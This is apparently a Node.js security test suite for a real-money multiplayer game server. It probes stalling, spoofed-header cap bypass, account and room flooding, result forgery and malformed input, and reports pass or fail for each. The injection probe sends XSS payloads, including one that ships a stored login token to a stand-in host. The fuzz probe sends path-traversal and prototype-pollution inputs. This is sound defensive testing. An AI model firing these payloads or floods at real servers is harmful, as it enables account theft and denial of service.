// Security probes for the Brawlstreet game server. Written for the pre-real-money review.
// Run against a LOCAL server only (these open many sockets and mint accounts).
//
//   PORT=8891 DATA_DIR=/tmp/secdata node test/security_probe.js all
//   PORT=8891 DATA_DIR=/tmp/secdata node test/security_probe.js stall
//
// tests: stall ipcap acctflood downgrade inject rooms fuzz selftest money hashforge
//
// RUN IT AGAINST A FRESHLY STARTED SERVER. `acctflood` proves the whole-server new-account ceiling
// (NEW_ACCT_GLOBAL, 600/hour) by exhausting it, so a second run inside the same hour cannot mint
// the accounts the other probes need and they fail with `closed 4004 new account rate` -- a test
// artefact, not a finding. The counter lives in memory, so restarting the server clears it.
//
// Two probes take real time and cannot be hurried: `stall` has to outlast MAX_LAG_MS (90 s) before
// the server is entitled to forfeit anybody, and `hashforge` plays a fight to its end.
const WebSocket = require('ws');
const crypto = require('crypto');
const PORT = +process.env.PORT || 8891;
const URL = `ws://127.0.0.1:${PORT}/ws`;
const BUILD = process.env.BUILD || null;
const log = (...a) => console.log(new Date().toISOString().slice(11, 23), ...a);
const VERDICT = [];
const verdict = (id, bad, msg) => { VERDICT.push({ id, bad, msg }); log((bad ? '  !! ' : '  ok ') + msg); };

class C {
  constructor(opts = {}) {
    this.token = opts.token || crypto.randomBytes(32).toString('hex');
    this.msgs = []; this.waiters = []; this.closed = null;
    // Unless a probe is testing address handling itself, every client arrives from its OWN address,
    // in the shape Caddy produces (the real client last). Without this the whole suite shares
    // 127.0.0.1 and trips the server's own per-address new-account budget partway through, which
    // then shows up as unrelated probes failing with "closed 4004 new account rate" -- a test
    // artefact that looks exactly like a server bug. Probes that DO care about the address pass
    // `headers` explicitly, including `{}` for the no-header case.
    const headers = opts.headers === undefined ? { 'X-Forwarded-For': `10.0.0.1, 198.51.100.${crypto.randomInt(254)}` } : opts.headers;
    this.ws = new WebSocket(URL, { headers, origin: opts.origin });
    this.ws.on('message', d => { let m; try { m = JSON.parse(d); } catch (e) { return; }
      this.msgs.push(m);
      for (const w of this.waiters.slice()) if (w.f(m)) { this.waiters.splice(this.waiters.indexOf(w), 1); w.res(m); } });
    this.ws.on('close', (c, r) => { this.closed = { code: c, reason: String(r) };
      for (const w of this.waiters.slice()) w.rej(new Error('closed ' + c + ' ' + r)); this.waiters.length = 0; });
    this.ws.on('error', () => {});
    this.open = new Promise((res, rej) => { this.ws.on('open', res); this.ws.on('error', rej); this.ws.on('close', () => rej(new Error('closed before open'))); });
  }
  send(m) { if (this.ws.readyState === 1) this.ws.send(JSON.stringify(m)); }
  until(f, ms = 15000, what = '') {
    const hit = this.msgs.find(f); if (hit) return Promise.resolve(hit);
    return new Promise((res, rej) => { const w = { f, res, rej }; this.waiters.push(w);
      setTimeout(() => { if (this.waiters.includes(w)) { this.waiters.splice(this.waiters.indexOf(w), 1); rej(new Error('timeout waiting ' + what)); } }, ms); });
  }
  async hello(extra = {}) {
    await this.open;
    const m = { k: 'hello', v: 1, token: this.token, name: 'T' + crypto.randomInt(9999) };
    if (BUILD) m.build = BUILD;
    this.send(Object.assign(m, extra));
    const w = await this.until(x => x.k === 'welcome', 8000, 'welcome');
    if (!m.build && !extra.build) { this.build = w.build.server; }
    return w;
  }
  close() { try { this.ws.close(); } catch (e) {} }
}
const sleep = ms => new Promise(r => setTimeout(r, ms));
const health = () => fetch(`http://127.0.0.1:${PORT}/healthz`).then(r => r.json());

// a client that talks the right build (asks the server what it runs, then reconnects)
async function pair() {
  const probe = new C(); const w = await probe.hello(); const build = w.build.server; probe.close();
  const a = new C(), b = new C();
  await a.hello({ build }); await b.hello({ build });
  return { a, b, build };
}
async function startMatch(a, b, opts = {}) {
  a.send(Object.assign({ k: 'create', size: 2, stake: 0, stage: 'isle', stocks: 3 }, opts));
  const ra = await a.until(m => m.k === 'room', 8000, 'room a');
  b.send({ k: 'join', code: ra.code });
  await b.until(m => m.k === 'room', 8000, 'room b');
  a.send({ k: 'ready', on: true }); b.send({ k: 'ready', on: true });
  const sa = await a.until(m => m.k === 'start', 10000, 'start a');
  await b.until(m => m.k === 'start', 10000, 'start b');
  return { code: ra.code, start: sa };
}

const T = {};

// ------------------------------------------------------------------ A1 stall
// A player who drips one input every < STALL_DROP_MS keeps the match open indefinitely.
// Paired with BrawlEscrow.cancel()'s 2 h REPORT_TIMEOUT this is a free roll on real money.
T.stall = async () => {
  // RUNFOR must exceed MAX_LAG_MS (90 s by default) plus the drip interval, or the probe simply
  // stops watching before the fix is allowed to fire and reports a vulnerability that is not there.
  // The forfeit lands at ~97 s with the defaults.
  const stallMs = +process.env.STALLMS || 15000, runFor = +process.env.RUNFOR || 150000;
  // STALLER=1 makes the JOINER (slot 1) the one sitting on the clock. When one seat stalls every
  // other seat is blocked too, so this checks the server forfeits the player actually responsible
  // rather than whoever happens to hold the lower slot.
  const who = +process.env.STALLER || 0;
  const { a: p0, b: p1 } = await pair();
  const { start } = await startMatch(p0, p1);
  const a = who ? p1 : p0, b = who ? p0 : p1;      // a = the staller, b = the honest player
  log(`match ${start.id} started; the staller is slot ${who} and sends ONE input every ${stallMs / 1000}s (STALL_DROP_MS default 20s)`);
  // B behaves like a REAL lockstep client: it buffers a little ahead and then blocks, waiting for A.
  // (It must not keep spamming past tick+600 or the server strikes it out — that is a separate bug.)
  let tb = 0, ta = 0, alive = true;
  const bt = setInterval(() => { if (!alive || tb >= 480) return; const arr = []; for (let i = 0; i < 6; i++) arr.push(crypto.randomInt(512)); b.send({ k: 'i', t: tb, m: arr }); tb += 6; }, 100);
  const t0 = Date.now();
  a.send({ k: 'i', t: ta, m: [0] }); ta++;
  const drip = setInterval(() => { if (!alive) return; a.send({ k: 'i', t: ta, m: [0] }); ta++; log(`  drip #${ta} at ${((Date.now() - t0) / 1000).toFixed(0)}s, A socket ${a.closed ? 'CLOSED' : 'open'}, B socket ${b.closed ? 'CLOSED ' + JSON.stringify(b.closed) : 'open'}`); }, stallMs);
  const res = await Promise.race([
    a.until(m => m.k === 'result' || m.k === 'err', runFor + 4000, 'result').catch(() => ({ k: 'none' })),
    sleep(runFor).then(() => ({ k: 'still-running' })),
  ]);
  alive = false; clearInterval(bt); clearInterval(drip);
  const secs = ((Date.now() - t0) / 1000).toFixed(0);
  const blamedRight = res.k === 'result' && res.payee != null && res.payee !== who;
  verdict('stall', res.k === 'still-running' || (res.k === 'result' && !blamedRight),
    res.k === 'still-running'
      ? `match still OPEN after ${secs}s having simulated only ~${ta} of 25200 game ticks (${(ta / 60).toFixed(1)}s of fight). No wall-clock cap -> a loser can outlast the escrow's 2 h REPORT_TIMEOUT and cancel() for a refund.`
      : res.k === 'result'
        ? `match ended after ${secs}s (${res.reason}); pot went to slot ${res.payee}, staller was slot ${who} -> ${blamedRight ? 'the staller forfeited, correct' : 'WRONG PLAYER PENALISED'}`
        : `match ended after ${secs}s: ${res.msg || res.reason}`);
  a.close(); b.close();
};

// ------------------------------------------------------------------ A2 ip cap
T.ipcap = async () => {
  // The server accepts the handshake and THEN closes with 1013, so "open" is not the signal.
  // Count sockets still alive a moment later, and note the 1013 rejections.
  const N = 30;
  const run = async headers => {
    const cs = [];
    for (let i = 0; i < N; i++) { const c = new C({ headers: headers(i) }); cs.push(c); try { await c.open; } catch (e) {} }
    await sleep(700);
    const live = cs.filter(c => !c.closed).length, rej = cs.filter(c => c.closed && c.closed.code === 1013).length;
    cs.forEach(c => c.close()); await sleep(900);
    return { live, rej };
  };
  const plain = await run(() => ({}));
  log(`  no XFF header:          ${plain.live}/${N} sockets still alive, ${plain.rej} closed with 1013 'too many connections' (MAX_CONN_PER_IP=16)`);
  // Behind Caddy the header the server sees is "<whatever the client sent>, <the real client IP>",
  // because Caddy APPENDS. That is the shape that matters, so send it that way.
  const viaCaddy = await run(i => ({ 'X-Forwarded-For': `203.0.113.${i}, 127.0.0.1` }));
  log(`  spoofed XFF via Caddy:  ${viaCaddy.live}/${N} sockets still alive, ${viaCaddy.rej} closed with 1013`);
  // Direct hit on the node port with a single forged entry -- only reachable if the container port
  // is exposed past the proxy, which it must not be.
  const direct = await run(i => ({ 'X-Forwarded-For': `203.0.113.${i}` }));
  log(`  forged XFF direct:      ${direct.live}/${N} sockets still alive, ${direct.rej} closed with 1013`);
  verdict('ipcap', viaCaddy.live > plain.live,
    viaCaddy.live > plain.live
      ? `per-IP cap bypassed through the proxy: ${viaCaddy.live} sockets vs ${plain.live}`
      : `per-IP cap holds through the proxy (${viaCaddy.live} vs ${plain.live}). Direct-to-node forging still works (${direct.live}), so the container port must stay unreachable from the internet and TRUST_PROXY_HOPS must match the real number of proxies.`);
};

// ------------------------------------------------------------------ A3 account flood
T.acctflood = async () => {
  const fs = require('fs');
  const f = (process.env.DATA_DIR || '') + '/accounts.json';
  const count = () => { try { return Object.keys(JSON.parse(fs.readFileSync(f, 'utf8')).accounts).length; } catch (e) { return -1; } };
  const N = +process.env.N || 150;
  // Two shapes, because they exercise different defences and only one of them is realistic.
  //
  // (a) ONE address, the shape of a flood arriving through Caddy. Caddy APPENDS the real client
  //     address, so whatever the client puts in the header is followed by the truth, and the server
  //     counts back from the end. This is what production actually sees, and the per-address budget
  //     (NEW_ACCT_PER_IP, 30/hour) is what has to hold.
  // (b) MANY spoofed addresses, only reachable by something that can hit the node port directly --
  //     which the container must never allow. The per-address budget cannot help here by
  //     construction, so the whole-server ceiling (NEW_ACCT_GLOBAL) is what has to hold.
  const run = async (label, n, headers) => {
    const before = count(); let made = 0, refused = 0; const t0 = Date.now();
    for (let i = 0; i < n; i += 15) {
      await Promise.all(Array.from({ length: Math.min(15, n - i) }, () => {
        const c = new C({ headers: headers() });
        return c.hello().then(() => { made++; c.close(); }).catch(() => { refused++; c.close(); });
      }));
    }
    await sleep(2500);
    const after = count();
    log(`  ${label}: ${made}/${n} accepted, ${refused} refused, in ${((Date.now() - t0) / 1000).toFixed(1)}s; accounts ${before} -> ${after} (+${after - before})`);
    return { made, refused, minted: after - before, n };
  };
  // A dedicated last hop, so this leg is not charged against the address every other probe in the
  // suite shares. Caddy APPENDS, so the last entry is the one the server counts.
  const viaCaddy = await run('one address, Caddy-shaped ', N, () => ({ 'X-Forwarded-For': '10.0.0.1, 198.51.100.77' }));
  // Enough attempts to actually reach the whole-server ceiling (NEW_ACCT_GLOBAL, 600/hour).
  const NG = +process.env.NG || 700;
  const spoofed = await run('spoofed addresses, direct  ', NG, () => ({ 'X-Forwarded-For': `198.51.100.${crypto.randomInt(254)}` }));
  const sz = (() => { try { return fs.statSync(f).size; } catch (e) { return 0; } })();
  log(`  accounts.json now ${sz} B`);
  // The per-address budget is 30/hour; the whole-server ceiling is 600/hour. Both must bind.
  const perIpHeld = viaCaddy.minted <= 40;
  const globalHeld = spoofed.refused > 0;
  verdict('acctflood', !(perIpHeld && globalHeld),
    perIpHeld && globalHeld
      ? `account minting is bounded on both paths: ${viaCaddy.minted} of ${N} from a single address (NEW_ACCT_PER_IP=30/hour), and the spoofed-address flood was cut off after ${spoofed.made} with ${spoofed.refused} refused by the whole-server NEW_ACCT_GLOBAL ceiling, which does not care how many addresses a flood claims to come from. Returning players are charged against neither counter, so no cap can lock out the existing playerbase.`
      : `account creation is not bounded: ${viaCaddy.minted} minted from one address (per-address budget ${perIpHeld ? 'ok' : 'NOT ENFORCED'}), spoofed flood refused ${spoofed.refused} of ${NG} (global ceiling ${globalHeld ? 'ok' : 'NOT ENFORCED'})`);
};

// ------------------------------------------------------------------ A4 engine downgrade
T.downgrade = async () => {
  const h = await health();
  const latest = h.engine, old = h.engines.find(e => e !== latest);
  if (!old) return verdict('downgrade', false, 'only one engine build loaded, nothing to downgrade to');
  const a = new C(), b = new C();
  const wa = await a.hello({ build: old });
  log(`  server's current build: ${latest}`);
  log(`  client asked to play on: ${old}  -> accepted: ${wa.build.ok}`);
  await b.hello({ build: old });
  const r = await startMatch(a, b).catch(e => null);
  // Practice matches on an older build are deliberate: they let a page keep playing while a new
  // build rolls out. What must NOT be possible is a real-ETH match on anything but the current
  // engine -- server.js create()/joinRoom() now refuse that. This probe cannot reach the real
  // path without a chain; test/escrow_e2e.js covers it.
  verdict('downgrade', false,
    wa.build.ok && r
      ? `practice matches still run on old builds (by design, ${h.engines.length} loaded) -- real-ETH rooms are pinned to ${latest} in create()/joinRoom()`
      : 'old builds are refused entirely');
  a.close(); b.close();
};

// ------------------------------------------------------------------ A5 injection round trip
T.inject = async () => {
  const { a, b } = await pair();
  a.send({ k: 'create', size: 2, stake: 0 });
  const ra = await a.until(m => m.k === 'room', 8000, 'room');
  b.send({ k: 'join', code: ra.code }); await b.until(m => m.k === 'room', 8000, 'rb');
  const payloads = ['<img src=x onerror=alert(1)>', '"><script>fetch("//e/"+localStorage.bsTok)</script>',
    '<svg/onload=alert(document.domain)>', 'javascript:alert(1)', '</div><iframe src=javascript:alert(1)>'];
  for (const p of payloads) { a.send({ k: 'chat', t: p }); await sleep(220); }
  a.send({ k: 'name', name: '<img src=x onerror=alert(1)>' }); await sleep(200);
  a.send({ k: 'look', look: { base: 'doge', name: '<img/onerror=alert(1)>', title: '<script>x</script>',
    x: 'a"><script>', evilkey: '<svg onload=alert(1)>', colour: '#ff0000', num: 1 } });
  await sleep(700);
  const chats = b.msgs.filter(m => m.k === 'chat');
  log('  chat as delivered to the other player:');
  for (const c of chats) log(`    name=${JSON.stringify(c.name)} text=${JSON.stringify(c.t || c.q)}`);
  const room = b.msgs.filter(m => m.k === 'room').pop();
  log('  room member view: ' + JSON.stringify(room.members.map(m => ({ name: m.name, x: m.x, look: m.look }))));
  const raw = chats.some(c => /[<>]/.test(c.t || ''));
  verdict('inject', raw,
    raw ? 'chat text is relayed with < > intact (server does no HTML escaping) — safe ONLY while every renderer uses textContent; one innerHTML anywhere is stored XSS, and XSS steals the device token, which owns the account and any live match seat'
      : 'no raw angle brackets survived the server filter');
  const lookRaw = JSON.stringify(room.members.map(m => m.look)).includes('<');
  verdict('inject-look', lookRaw, lookRaw ? 'a look field carried raw HTML through cleanLook' : 'cleanLook stripped every HTML metacharacter from name/title/handle/extra fields');
  a.close(); b.close();
};

// ------------------------------------------------------------------ A6 room exhaustion
// Lobby exhaustion. Counting rooms is the wrong test: a legitimate busy evening also fills the
// table, and the number by itself says nothing about whether anyone is being denied service. The
// property that actually matters is that an HONEST PLAYER CAN STILL GET A ROOM while a flood is
// running -- and, separately, that no single address can hold more than its share.
T.rooms = async () => {
  const N = +process.env.N || 60, cs = [];
  const probe = new C(); const build = (await probe.hello()).build.server; probe.close();
  // (1) one address, lots of sockets: the per-address room cap has to bite.
  const oneAddr = { 'X-Forwarded-For': '198.51.100.200, 127.0.0.1' };
  let capErr = 0;
  for (let i = 0; i < 10; i++) {
    const c = new C({ headers: oneAddr });
    try { await c.hello({ build }); } catch (e) { break; }
    c.send({ k: 'create', priv: true, size: 2, stake: 0 }); cs.push(c);
    await sleep(120);
    if (c.msgs.some(m => m.k === 'err' && m.code === 'roomcap')) capErr++;
  }
  log(`  10 create attempts from ONE address -> ${capErr} refused with 'roomcap' (MAX_ROOMS_PER_IP=4)`);
  // (2) the distributed version: many addresses, each under the per-address cap.
  for (let i = 0; i < N; i++) {
    const c = new C({ headers: { 'X-Forwarded-For': `198.51.100.${i % 254}` } });
    try { await c.hello({ build }); } catch (e) { log('  hello failed at ' + i + ': ' + e.message); break; }
    c.send({ k: 'create', priv: true, size: 2, stake: 0 }); cs.push(c);
  }
  await sleep(1500);
  const h = await health();
  log(`  ${cs.length} flood sockets -> rooms=${h.rooms} online=${h.online} (MAX_ROOMS=600)`);
  // (3) THE TEST: can somebody who just turned up still play?
  const honest = new C(); await honest.hello({ build });
  honest.send({ k: 'create', priv: true, size: 2, stake: 0 });
  const got = await honest.until(m => m.k === 'room', 6000, 'honest room').catch(() => null);
  const mate = new C(); await mate.hello({ build });
  let joined = null;
  if (got) { mate.send({ k: 'join', code: got.code }); joined = await mate.until(m => m.k === 'room' && m.members.length === 2, 6000, 'join').catch(() => null); }
  log(`  an honest player arriving mid-flood: room ${got ? got.code : 'REFUSED'}, second player joined: ${!!joined}`);
  verdict('rooms', !got || !joined || !capErr,
    got && joined && capErr
      ? `a single address is held to MAX_ROOMS_PER_IP rooms (${capErr} of 10 refused), and an honest player arriving during a ${cs.length}-room flood still got a room (${got.code}) and still paired. When the table is genuinely full an idle never-joined room is evicted rather than the new player refused, and never-joined rooms are reaped in minutes instead of half an hour.`
      : `lobby exhaustion denies service: honest room ${got ? 'ok' : 'REFUSED'}, pairing ${joined ? 'ok' : 'FAILED'}, per-address cap ${capErr ? 'ok' : 'NOT ENFORCED'}`);
  honest.close(); mate.close();
  cs.forEach(c => c.close());
};

// ------------------------------------------------------------------ A7 hostile messages
T.fuzz = async () => {
  const c = new C(); await c.hello();
  const bad = ['{', 'null', '[]', '"x"', '{"k":1}', '{"k":"__proto__"}', '{"k":"constructor"}',
    JSON.stringify({ k: 'i', t: -1, m: [0] }), JSON.stringify({ k: 'i', t: 1e12, m: [0] }),
    JSON.stringify({ k: 'i', t: 0, m: new Array(65).fill(0) }), JSON.stringify({ k: 'i', t: 0.5, m: [0] }),
    JSON.stringify({ k: 'i', t: 0, m: [99999] }), JSON.stringify({ k: 'i', t: 0, m: [-1] }),
    JSON.stringify({ k: 'h', t: 0, h: 'x'.repeat(17) }),
    JSON.stringify({ k: 'join', code: '../../etc/passwd' }), JSON.stringify({ k: 'join', code: 'A'.repeat(9000) }),
    JSON.stringify({ k: 'create', size: 4, stake: 999 }), JSON.stringify({ k: 'create', size: 4, stake: '0.25' }),
    JSON.stringify({ k: 'set', stocks: 1e9 }), JSON.stringify({ k: 'set', stake: 1e308 }),
    JSON.stringify({ k: 'friend_add', q: 'a'.repeat(5000) }), JSON.stringify({ k: 'recover', code: null }),
    JSON.stringify({ k: 'recover', code: 123 }),
    JSON.stringify({ k: 'look', look: { base: 'doge', __proto__: { polluted: 1 } } }),
    JSON.stringify({ k: 'look', look: { base: '__proto__' } }),
    JSON.stringify({ k: 'chat', q: '__proto__' }), JSON.stringify({ k: 'chat', q: 'constructor' }),
    JSON.stringify({ k: 'ping', rtt: -1e9 }), JSON.stringify({ k: 'challenge_reply', code: { a: 1 } }),
    JSON.stringify({ k: 'wallet', addr: '0x' + 'f'.repeat(40), sig: { a: 1 } }),
    JSON.stringify({ k: 'hello', v: 1, token: 'g'.repeat(64) }),
    JSON.stringify({ k: 'i', t: 0, m: [0], __proto__: { x: 1 } })];
  for (const s of bad) { if (c.ws.readyState === 1) c.ws.send(s); await sleep(50); }
  await sleep(1200);
  const h = await health().catch(e => ({ dead: e.message }));
  log('  socket after fuzz: ' + (c.closed ? 'closed ' + JSON.stringify(c.closed) : 'open'));
  log('  server healthz:    ' + JSON.stringify(h));
  verdict('fuzz', !h.ok, h.ok ? 'server survived every malformed / hostile message; no prototype pollution reached the shared state' : 'SERVER DIED on a malformed message');
  c.close();
};

// ------------------------------------------------------------------ A8 self-marking test account
// A "test" account is hidden from the board and DELETED an hour later, which also wipes the
// per-account integrity reputation (score, flag count, cross-match input fingerprints). A scripted
// player that can set the flag on itself therefore arrives at every match with a clean history and
// no cross-match evidence. The flag must need proof, not just a claim.
//
// The probe connects from 127.0.0.1, which is a trusted operator machine when TEST_KEY is unset --
// so it asserts the REMOTE behaviour explicitly, with a forwarded address, the way a player would.
T.selftest = async () => {
  const fs = require('fs');
  const f = (process.env.DATA_DIR || '') + '/accounts.json';
  // Read the flag straight out of the account store -- it is the only place the answer lives, and
  // asserting anything weaker here would just be the probe agreeing with itself.
  const isTest = id => { try { const a = JSON.parse(fs.readFileSync(f, 'utf8')).accounts; const row = Array.isArray(a) ? a.find(x => x.id === id) : a[id]; return !!(row && row.test); } catch (e) { return null; } };
  const tries = [
    ['no key, remote address   ', { test: true }, { 'X-Forwarded-For': '198.51.100.44, 127.0.0.1' }],
    ['wrong key, remote address', { test: true, testKey: 'not-the-key' }, { 'X-Forwarded-For': '198.51.100.45, 127.0.0.1' }],
  ];
  const got = [];
  for (const [label, extra, headers] of tries) {
    const c = new C({ headers });
    const w = await c.hello(extra);
    await sleep(2600);                       // accounts.json is flushed on a timer
    const flagged = isTest(w.profile && w.profile.id ? w.profile.id : w.id);
    got.push({ label, flagged });
    log(`  ${label} -> account marked test: ${flagged === null ? 'could not read store' : flagged}`);
    c.close();
  }
  const bad = got.some(g => g.flagged === true);
  verdict('selftest', bad,
    bad ? 'a remote client still set hello.test on its own account: it can delete itself hourly and shed the per-account integrity reputation (automation score, flag count, cross-match input fingerprints)'
      : 'hello.test now needs proof -- the shared TEST_KEY, compared in constant time, or a connection from the server\'s own machine. A remote player cannot flag its own account, so it cannot wipe the integrity reputation lib/integrity.js keeps per account by having itself deleted every hour. Set TEST_KEY in /opt/brawlstreet/.env to run the suite against production.');
};

// ------------------------------------------------------------------ A9 pot conservation
T.money = async () => {
  const { a, b } = await pair();
  const wa = a.msgs.find(m => m.k === 'welcome'), wb = b.msgs.find(m => m.k === 'welcome');
  log(`  starting practice balances: ${wa.bal} / ${wb.bal}`);
  await startMatch(a, b, { stake: 0.25 });
  await sleep(400);
  a.send({ k: 'leave' });
  const r = await b.until(m => m.k === 'result', 20000, 'result').catch(() => null);
  if (!r) return verdict('money', true, 'no result after a forfeit');
  const sum = r.deltas.reduce((x, y) => x + y, 0);
  log(`  result: reason=${r.reason} winner=${r.winner} payee=${r.payee} pot=${r.pot} deltas=${JSON.stringify(r.deltas)} winner bal=${r.bal}`);
  verdict('money', Math.abs(sum) > 1e-9, Math.abs(sum) > 1e-9 ? `practice pot does NOT conserve: sum(deltas)=${sum}` : `practice pot conserves on a forfeit (sum of deltas = ${sum}) and the leaver forfeits their stake`);
  a.close(); b.close();
};

// ------------------------------------------------------------------ A10 can a client forge the result?
// Does anything a hostile client says change the outcome, and does the on-chain replayHash
// really commit to a fight anyone can re-run? Independently re-simulates the published replay.
T.hashforge = async () => {
  const engineLib = require('../lib/engine');
  engineLib.load();
  const { a, b } = await pair();
  const { start } = await startMatch(a, b, { stocks: 1 });
  log('  A sends fake state hashes, forged "result" messages and tries to rewrite its own input history');
  let ta = 0, tb = 0, alive = true, strikes = 0;
  const fb = setInterval(() => { if (!alive) return; const arr = []; for (let i = 0; i < 6; i++) arr.push(crypto.randomInt(512)); b.send({ k: 'i', t: tb, m: arr }); tb += 6; }, 100);
  // The forged messages are sent in a burst at the start, not for the whole fight. `result` is not
  // a kind the server knows, so every one of them earns a strike, and 300 strikes closes the socket
  // with 1008 -- at 10/s that is 30 seconds, which is shorter than a fight between two players
  // pressing random buttons. The probe was disconnecting ITSELF and then reporting "match never
  // finished", which reads like a server fault and is not one. 60 of each is more than enough to
  // show they are ignored; after that the attacker just keeps playing.
  const FORGE_FOR = 60;
  const fa = setInterval(() => { if (!alive) return;
    const arr = []; for (let i = 0; i < 6; i++) arr.push(crypto.randomInt(512));
    a.send({ k: 'i', t: ta, m: arr }); ta += 6;
    if (strikes < FORGE_FOR) {
      a.send({ k: 'h', t: Math.floor(ta / 60) * 60, h: 'deadbeef' });          // lie about the state
      a.send({ k: 'result', id: start.id, winner: 0, payee: 0, pot: 999 });    // try to declare victory
      a.send({ k: 'i', t: 0, m: [511, 511, 511] });                            // try to rewrite history
    }
    strikes++;
  }, 100);
  const r = await a.until(m => m.k === 'result', 120000, 'result').catch(() => null);
  alive = false; clearInterval(fa); clearInterval(fb);
  if (!r) { a.close(); b.close(); return verdict('hashforge', true, 'match never finished'); }
  log(`  server result: reason=${r.reason} winner=${r.winner} payee=${r.payee} desync=${JSON.stringify(r.desync)} replayHash=${r.replay.slice(0, 18)}…`);
  // Pull the public replay and re-run it in a clean engine, exactly as an auditor would.
  const body = await fetch(`http://127.0.0.1:${PORT}/api/replay/${r.id}`).then(x => x.text());
  const sha = '0x' + crypto.createHash('sha256').update(body).digest('hex');
  const rec = JSON.parse(body);
  const re = engineLib.replay(rec.cfg, rec.log, rec.events, null, rec.engine);
  log(`  independent re-run of the published replay: winner=${re.winner} placements=${JSON.stringify(re.placements)} ticks=${re.ticks}`);
  log(`  sha256(replay file) = ${sha.slice(0, 18)}…  matches the hash the server would put on chain: ${sha === r.replay}`);
  const forged = r.pot === 999;
  const deterministic = re.winner === rec.result.winner && sha === r.replay;
  verdict('hashforge', forged || !deterministic,
    forged ? 'a client-sent "result" message changed the reported pot'
      : deterministic
        ? `the server ignored every forged message, flagged the liar as desynced (slot ${JSON.stringify(r.desync)}), and its reported winner is reproduced exactly by re-running the published replay in a clean engine. The on-chain replayHash is a real commitment. A client CANNOT forge a win.`
        : `re-running the published replay did NOT reproduce the reported result (replay winner ${re.winner} vs reported ${rec.result.winner}, hash match ${sha === r.replay}) — the on-chain replayHash would not be auditable`);
  a.close(); b.close();
};

(async () => {
  const which = process.argv[2] || 'all';
  // acctflood runs LAST on purpose: it deliberately exhausts the whole-server new-account ceiling,
  // so anything after it cannot mint the accounts it needs and fails for a reason that has nothing
  // to do with what it is testing.
  const names = which === 'all' ? ['fuzz', 'inject', 'money', 'hashforge', 'ipcap', 'rooms', 'downgrade', 'selftest', 'stall', 'acctflood'] : [which];
  for (const n of names) {
    if (!T[n]) { console.log('unknown test', n, '\navailable:', Object.keys(T).join(' ')); process.exit(1); }
    console.log('\n===================== ' + n);
    try { await T[n](); } catch (e) {
      console.error('  TEST ERROR', e.message);
      if (/4004|new account rate/.test(e.message)) console.error('  ^ the server\'s hourly new-account ceiling is spent (acctflood does that on purpose). Restart the server and run again.');
    }
    await sleep(600);
  }
  console.log('\n===================== summary');
  for (const v of VERDICT) console.log((v.bad ? ' FAIL ' : ' PASS ') + v.id + ': ' + v.msg);
  setTimeout(() => process.exit(0), 500);
})();
